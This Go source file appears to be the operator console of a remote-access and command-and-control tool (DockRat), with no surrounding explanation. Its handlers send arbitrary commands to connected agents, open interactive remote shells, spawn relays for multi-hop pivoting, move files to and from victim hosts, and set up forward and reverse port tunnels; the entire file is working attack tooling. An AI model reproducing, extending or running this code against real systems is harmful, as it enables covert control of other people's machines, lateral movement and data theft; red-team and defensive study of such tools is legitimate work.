package protocol

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/Singert/DockRat/core/node"
	"github.com/google/uuid"
)

func StartConsole(registry *node.Registry) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		PrintPrompt()
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		tokens := strings.SplitN(input, " ", 2)
		cmd := tokens[0]
		arg := ""
		if len(tokens) > 1 {
			arg = tokens[1]
		}

		switch cmd {
		case "detail":
			handleDetail(registry)
		case "exec":
			handleExec(arg, registry)
		case "shell":
			handleShell(arg, registry)
		case "startrelay":
			handleStartRelay(arg, registry)
		case "topo":
			handleTopo(registry)
		case "upload":
			handleUpload(arg, registry)
		case "download":
			handleDownload(arg, registry)
		case "forward":
			handleForward(arg, registry)
		case "backward":
			handleBackward(arg, registry)

		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func handleDetail(reg *node.Registry) {
	nodes := reg.List()
	fmt.Println("[+] Connected nodes:")
	for _, n := range nodes {
		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s\n",
			n.ID, n.Addr, n.Hostname, n.Username, n.OS)
	}
}

func handleExec(arg string, reg *node.Registry) {
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) != 2 {
		fmt.Println("[-] Usage: exec <id> <command>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	cmdPayload := map[string]string{"cmd": parts[1]}
	data, _ := json.Marshal(cmdPayload)
	msg := Message{Type: MsgCommand, Payload: data}

	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
		fmt.Println("[-]", err)
	} else {
		fmt.Println("[+] Exec command sent.")
	}
}

func handleShell(arg string, reg *node.Registry) {
	var nid int
	fmt.Sscanf(arg, "%d", &nid)

	msg := Message{Type: MsgShell, Payload: []byte("start shell")}
	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
		fmt.Println("[-]", err)
		return
	}

	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("remote$ ")
		if !scanner.Scan() {
			break
		}
		line := scanner.Text()
		if strings.TrimSpace(line) == "exit" {
			break
		}
		cmdMsg := Message{Type: MsgShell, Payload: []byte(line + "\n")}
		if err := sendMessageOrRelay(nid, cmdMsg, reg); err != nil {
			fmt.Println("[-] Shell write failed:", err)
			break
		}
	}
}

func handleStartRelay(arg string, reg *node.Registry) {
	parts := strings.Fields(arg)
	if len(parts) != 2 {
		fmt.Println("Usage: startrelay <node_id> <port>")
		return
	}
	var nid int
	port := parts[1]
	fmt.Sscanf(parts[0], "%d", &nid)

	// 分配编号段（每个 relay 分配 1000 个 ID）
	baseID := nid * 1000
	payload := StartRelayPayload{
		SelfID:     nid,
		ListenAddr: ":" + port,
		IDStart:    baseID + 1,
		Count:      999,
	}
	data, _ := json.Marshal(payload)
	msg := Message{
		Type:    MsgStartRelay,
		Payload: data,
	}

	// ❗使用通用发送函数，自动 relay
	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
		fmt.Println("[-] Failed to send startrelay:", err)
		return
	}
	fmt.Printf("[+] Sent startrelay to node %d, range = [%d ~ %d]\n", nid, payload.IDStart, payload.IDStart+payload.Count-1)
}
func handleTopo(reg *node.Registry) {
	reg.PrintTopology()
}
func sendMessageOrRelay(nid int, msg Message, reg *node.Registry) error {
	data, err := EncodeMessage(msg)
	if err != nil {
		return fmt.Errorf("encode failed: %w", err)
	}

	n, ok := reg.Get(nid)
	if !ok {
		return fmt.Errorf("no such node")
	}

	// 如果是直连 agent，直接发送
	if n.Conn != nil {
		_, err := n.Conn.Write(data)
		return err
	}

	// 否则构造 RelayPacket
	parentID := reg.NodeGraph.GetParent(nid)
	parentNode, ok := reg.Get(parentID)
	if !ok || parentNode.Conn == nil {
		return fmt.Errorf("no relay available for node %d", nid)
	}

	packet := RelayPacket{
		DestID: nid,
		Data:   data,
	}
	pktBytes, _ := json.Marshal(packet)
	wrapped := Message{
		Type:    MsgRelayPacket,
		Payload: pktBytes,
	}
	buf, err := EncodeMessage(wrapped)
	if err != nil {
		return fmt.Errorf("relay encode error: %w", err)
	}
	_, err = parentNode.Conn.Write(buf)
	return err
}
func handleUpload(arg string, reg *node.Registry) {
	parts := strings.Fields(arg)
	if len(parts) != 3 {
		fmt.Println("Usage: upload <id> <local> <remote>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	localPath := parts[1]
	remotePath := parts[2]

	info, err := os.Stat(localPath)
	if err != nil {
		fmt.Println("[-] Local file error:", err)
		return
	}

	meta := FileMeta{
		Filename: info.Name(),
		Path:     remotePath,
		Size:     info.Size(),
	}
	metaBytes, _ := json.Marshal(meta)
	msg := Message{Type: MsgUpload, Payload: metaBytes}
	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
		fmt.Println("[-] Failed to send upload meta:", err)
		return
	}

	// 分片上传
	f, err := os.Open(localPath)
	if err != nil {
		fmt.Println("[-] Open local file failed:", err)
		return
	}
	defer f.Close()

	buf := make([]byte, 4096)
	var offset int64 = 0
	for {
		n, err := f.Read(buf)
		if err != nil && err != io.EOF {
			fmt.Println("[-] Read error:", err)
			return
		}
		eof := (err == io.EOF)

		chunk := FileChunk{
			Offset: offset,
			Data:   buf[:n],
			EOF:    eof,
		}
		data, _ := json.Marshal(chunk)
		chunkMsg := Message{Type: MsgFileChunk, Payload: data}
		if err := sendMessageOrRelay(nid, chunkMsg, reg); err != nil {
			fmt.Println("[-] Failed to send chunk:", err)
			return
		}
		offset += int64(n)
		if eof {
			break
		}
	}
	fmt.Println("[+] Upload complete")
}
func handleDownload(arg string, reg *node.Registry) {
	parts := strings.Fields(arg)
	if len(parts) != 3 {
		fmt.Println("Usage: download <id> <remote> <local>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	remotePath := parts[1]
	localPath := parts[2]

	// 保存目标路径 + 打开文件句柄
	out, err := os.Create(localPath)
	if err != nil {
		fmt.Println("[-] Cannot create local file:", err)
		return
	}
	SetFileReceiver(
		func(offset int64, data []byte) {
			out.WriteAt(data, offset)
		},
		func() {
			out.Close()
		},
	)

	req := DownloadRequest{Path: remotePath}
	data, _ := json.Marshal(req)
	msg := Message{
		Type:    MsgDownload,
		Payload: data,
	}
	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
		fmt.Println("[-] Failed to send download request:", err)
		return
	}
	fmt.Println("[+] Download request sent. Waiting for data...")
}
func handleForward(arg string, reg *node.Registry) {
	parts := strings.Fields(arg)
	if len(parts) != 3 {
		fmt.Println("Usage: forward <id> <local_port> <remote_host:port>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	localPort := parts[1]
	remoteTarget := parts[2]

	go StartPortForward(nid, localPort, remoteTarget, reg)
}

func handleBackward(arg string, reg *node.Registry) {

	parts := strings.Fields(arg)
	if len(parts) != 3 {
		fmt.Println("Usage: backward <id> <agent_listen_port> <admin_target>")
		return
	}
	var nid, port int
	fmt.Sscanf(parts[0], "%d", &nid)
	fmt.Sscanf(parts[1], "%d", &port)
	target := parts[2]
	// ✅ 预分配一个 connID 前缀用于匹配 agent 回传连接
	connIDPrefix := uuid.New().String()[:8]
	SetBackwardTargetPrefix(connIDPrefix, target, nid)
	// 将 prefix 暂存为 "fake target"，agent 使用它构造 connID
	payload := BackwardListenPayload{
		ListenPort: port,
		Target:     connIDPrefix, // ⚠️ 发送的是 connID 前缀占位
	}
	data, _ := json.Marshal(payload)
	msg := Message{Type: MsgBackwardListen, Payload: data}

	err := sendMessageOrRelay(nid, msg, reg)
	if err != nil {
		fmt.Printf("[-] Failed to send backward listen: %v\n", err)
		return
	}
	fmt.Printf("[+] Instructed agent[%d] to listen on :%d (→ admin connect %s)\n", nid, port, target)
}
